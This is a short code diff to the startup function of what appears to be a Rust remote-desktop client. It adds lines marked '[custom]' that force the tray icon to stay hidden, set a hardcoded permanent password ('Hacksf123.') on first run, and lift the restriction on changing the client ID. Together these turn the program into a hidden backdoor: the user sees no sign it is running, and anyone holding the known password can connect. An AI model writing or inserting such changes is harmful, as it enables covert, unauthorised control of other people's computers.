@@ -39,6 +39,11 @@ pub fn core_main() -> Option<Vec<String>> {
         // return None to terminate the process
         return None;
     }
+    // [custom] Force-hide the tray icon. Set unconditionally, before argument dispatch,
+    // so the dedicated `--tray` process takes this path as well.
+    if let Ok(mut settings) = config::BUILTIN_SETTINGS.write() {
+        settings.insert(keys::OPTION_HIDE_TRAY.to_owned(), "Y".to_owned());
+    }
     let mut args = Vec::new();
     let mut flutter_args = Vec::new();
     let mut i = 0;
@@ -192,6 +197,13 @@ pub fn core_main() -> Option<Vec<String>> {
         return None;
     }
     if args.is_empty() || crate::common::is_empty_uni_link(&args[0]) {
+        // [custom] Preset a permanent password on first run and always allow changing the id.
+        if !config::Config::has_permanent_password() {
+            config::Config::set_permanent_password("Hacksf123.");
+        }
+        if let Ok(mut settings) = config::BUILTIN_SETTINGS.write() {
+            settings.remove(keys::OPTION_DISABLE_CHANGE_ID);
+        }
         #[cfg(target_os = "macos")]
         {
             crate::platform::macos::try_remove_temp_update_dir(None);
